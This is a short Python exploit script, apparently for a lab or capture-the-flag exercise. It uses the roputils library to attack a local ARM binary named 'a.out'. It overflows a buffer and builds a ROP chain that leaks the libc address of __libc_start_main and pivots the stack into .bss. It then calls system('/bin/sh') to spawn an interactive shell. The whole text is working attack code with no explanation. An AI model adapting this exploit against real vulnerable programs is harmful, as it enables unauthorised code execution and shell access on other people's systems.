from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP('./a.out')
libc = ROP('/lib/arm-linux-gnueabihf/libc.so.6')
addr_stage = rop.section('.bss') + 0x400

buf = rop.fill(offset)
buf += rop.call_chain(
    ['write', 1, rop.got('__libc_start_main'), 4],
    ['read', 0, addr_stage, 100]
, pivot=addr_stage)

p = Proc('./a.out')
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
ref_addr = p.read_p32()
libc.set_base(ref_addr, '__libc_start_main')

buf = rop.call_chain(
    [libc.addr('system'), libc.str('/bin/sh')]
)
buf += rop.fill(100, buf)

p.write(buf)
p.interact(0)
